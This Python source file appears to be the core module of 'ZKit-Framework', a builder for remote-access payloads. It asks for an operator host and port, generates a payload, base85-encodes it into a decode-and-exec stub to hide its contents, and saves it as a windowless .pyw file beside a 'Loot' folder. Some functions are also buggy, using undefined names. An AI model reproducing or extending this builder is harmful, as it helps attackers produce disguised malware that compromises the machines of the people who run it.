"""

The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file

"""
# Python 2 is supported too
from __future__ import print_function, division, absolute_import
import os
import random
from base64 import b85encode as be
import socket as s
from core.lib.payload import PayloadGenerator
path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))

DECODE_STUB = 'from base64 import b85decode\nvalue ="""{}"""''\nexec(b85decode(value))'


def init():
    'inits the zkit . without you will get several errors'
    pathslist = [path + "\\Builded\\", path + '\\Loot\\',
                 path + "\\User\\Payloads\\"

                 ]
    for _path in pathslist:
        os.popen("mkdir {}".format(_path)).close()
    os.popen('echo > {}'.format(path + "\\Errors.log"))
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Color:
    'ANSI Color codes'

    def __init__(self):
        self.colors = {
            "black": "\033[30m",
            "red": "\033[31m",
            "green": "\033[32m",
            "yellow": "\033[33m",
            "blue": "\033[34m",
            "magenta": "\033[35m",
            "cyan": "\033[36m",
            "grey": "\033[37m",
            "reset": "\033[0m",
        }

    def GetColor(self, colorname):  # pylint: disable=C0103; # noqa
        'Gets a color from colors dict case insensetive'
        return self.colors.get(colorname.lower())

    def GetAllColors(self):  # pylint: disable=C0103; # noqa
        "returns all colors and reset as a tuple"
        return tuple(self.colors.values())

    def RandomColor(self):
        colors = [*self.GetAllColors()]
        gc = self.GetColor
        to_remove = ['grey', 'reset', 'black']
        for r in to_remove:
            colors.remove(gc(r))
        return random.choice([colors])


def search_for_payloads(where="\\User\\Payloads\\") -> dict:
    "searches \\User\\Payloads\\ for payloads to install or the place you say"
    payloads = {}
    for r, d, _ in os.walk(path + where):
        for payload in d:

            payloads[payload] = r + payload

    return payloads


def list_payloads(payloads=search_for_payloads()):
    "You can get the result form search_user_payloads or i will do it"
    col = Color()
    for index, payload in enumerate(payloads.keys()):
        print(random.choice(col.RandomColor()) + "{%s} --> %s" % (str(index + 1), payload + ((15 - len(payload))
                                                                                             * " ") + " >>> " + payloads[payload].replace(path, '')) + col.GetColor('reset'))
        print("")
    print("{000} --> Back To Main Menu")

    return payloads


def list_builtin_payloads(payload_type):
    path = "\\core\\lib\\payloads\\" + payload_type + "\\"
    payloads = search_for_payloads(path)
    payloads = list_payloads(payloads)
    print("Please Choose One Of Them (Number Of It): ", end="")
    return payloads


def crash_handler(exception: BaseException):
    with open(os.path.dirname(__file__) + "\\Errors.log", "a") as f:
        f.write("[{}] : {}\n".format(dt.now(), e))
    print("Sth went really wrong that we couldnt handle it\n"
          + "the exceptions value have saved to Errors.log\n"
          + "please report this on github to me."
          + "Do you want zkit to reraise it ? (reraising may help better) (Y/N): ", end='')
    choice = str(input()).lower()
    if choice.strip() == "y":
        print("This is going to print full error . please report it on github")
        raise
    else:
        print("Ignoring")


def notify(status: str, message: str, ending="\n", flush=False):
    """
    notifies the user with given parameters . you can customize it very well

    Args:
        message (str): message shown for the user
        status (str): status for event . all possibleties are "notify",
        "problem", "report" and "question"
        statuses will be converted to lower .
        ending (str): used as value for print(message, end = ending)
        flush (bool): to flush the stream or not (default=False)
    """
    col = Color()
    reset = col.GetColor('reset')
    status = status.lower()
    all_stats = {'report': 'blue|[ REPORT ]',
                 'notify': 'green|[ NOTIFY ]',
                 'problem': 'red|[CRITICAL]',
                 'question': 'yellow|[QUESTION]',
                 }
    for stat in all_stats:
        if stat == status:
            temp = all_stats[stat].split('|')
            first = col.GetColor(temp[0]) + temp[1] + reset
            break
    print("{}{} {}".format(
        '\r' if flush else '', first, message), end=ending)


def ask_for(message: str, report: str, default=None, type=str, args=None):  # pylint: disable=W0622; # noqa
    """
    Asks for anything from users . (uses notify)

    Args:
        message (str): message to show the user to ask for details .
        report (str): message to show user that your data is correct .
        default (list): default value and action for that if callable calls it with the arguments
        else replaces it with default[1] . (Defaults to None).
        type (type): type of data to apply to input. (Default : str)
        args (None): args to pass to fuction. Defaults to None.

    Returns:
        (type): the value user entered in type of the "type" argument.
        changed if matched the default to whatever to put in defaults[1]
    """
    notify('question', message, '')
    default = ['', ''] if default is None else default
    if type == list:
        value = str(input("")).split()

    else:
        value = type(input(""))

    if value == default[0]:
        if callable(default[1]):
            if args == ("DEFAULT"):
                value = default[1](value)
            elif args is None:
                value = default[1]()
            else:
                value = default[1](args)
        else:
            value = default[1]
    notify('report', report.replace('\\|', str(value), 1))
    return value


def create_file(file: str):
    """
    Creates A New file if a file is on the given path if exists asks for overwrite permission
    if yes clears file data then closes it if no asks for another file path

    Arguments:
        file (str) : Path to File to create if exists asks for overwriting permission

    Returns A Path if file created returns file path if not returns asked file path
    or returns none if got wrong answer at the YES or NO overwrite permission ask
    """
    notify("notify", "Creating File...", "")
    try:
        _ = open(file, "x").close()
    except FileExistsError:
        notify(
            "problem", "Creating File...Failed \n" +
            "File Already Exists Confirm Overwrite : (N or Y) ", "", True
        )
        choice = str(input("")).upper()
        if choice == "Y":
            pass
        elif choice == "N":
            file = os.path.dirname(
                file) + "\\" + str(input("Write Down new file name here : ")) + ".pyw"
        else:
            notify("problem", "\nInvalid Input Try Again")
            while True:
                notify("File Already Exists Confirm Overwrite : (N or Y) ", "")
                choice = str(input("")).upper()
                if choice == "Y":  # pylint: disable=R1723; # noqa
                    break
                elif choice == "N":
                    file = str(
                        input("Write Down An Other File Name Here : ")) + ".pyw"
                    break
                else:
                    notify("problem", "\nInvalid Input Try Again")
    else:
        notify("report",
               "Creating File...Done ", "\n", True)
    return file


def open_file(path: str):
    notify("notify", "Opening File To Write Data On It...", "")
    try:
        file = open(path, "w+")
    except Exception:  # pylint: disable=W0703; # noqa
        notify(
            "problem", "Opening File To Write Data On It...Failed \n Cannnot Open File", "\n", True)
        return
    except PermissionError:
        notify(
            "problem", "Opening File To Write Data On It...Failed \n Permission Denied", "\n", True)
        return
    else:
        notify("report",
               "Opening File To Write Data On It...Done", "\n", True)
    return file


def write_file(file, data: str):
    if file.writable():
        file.write(data)

    else:
        notify('problem', "The file is not writable please try again . "
               "if the problem presists please report it")
    file.close()


class Generate:
    def __init__(self, root: str):
        "generates payloads with given root, "
        self.root = root
        self.get_info()
        self.get_payload()
        self.payload = encrypt_it(self.payload)
        self.path = create_file(path + "\\Builded\\" + self.path + ".pyw")
        f = open_file(self.path)
        write_file(f, self.payload)
        notify('report', "Operaion Was Successful")

    def get_info(self):
        self.host = ask_for("Whats you ip address, hostname" +
                            "left it to empty to use your own hostname (automic) : ",
                            "Using ip \\| as Host", default=['', s.gethostbyname],
                            args=s.gethostname()
                            )
        self.port = ask_for("Whats An Open Port In Your Machine " +
                            "Left It '-1' To Use Default Port (1534 Eclipse's "
                            "default communicate port) : ", "Using \\| As Port",
                            default=[-1, 1534], type=int,
                            )
        self.path = ask_for("Whats the filename  " +
                            "for your zkit generated script : ",
                            "using \\|.pyw as your filename",
                            default=['', ''], type=str,
                            )

    def get_payload(self) -> str:
        self.payload = PayloadGenerator(
            self.root).generate(self.host, self.port)


def encrypt_it(payload) -> str:
    notify("notify", "Encrypting Data Before Writing On File...", "")
    payload = be(payload.encode("UTF-8")).decode("UTF-8")
    notify("report",
           "Encrypting Data Before Writing On File...Done", "\n", True)
    return DECODE_STUB.format(payload)


def print_banner():
    from core.helper_core.banners import banner1, banner2
    "gets a random color and a random banner and prints it"
    _, red, green, _, blue, magenta, cyan, _, reset = Color().GetAllColors()
    random.seed(random.choice(
        [random.randint(1, 9999), random.randint(1, 998)]))
    banner = random.choice([banner1, banner2])
    color = random.choice([red, green, blue, magenta, cyan])
    print(color + banner + reset)
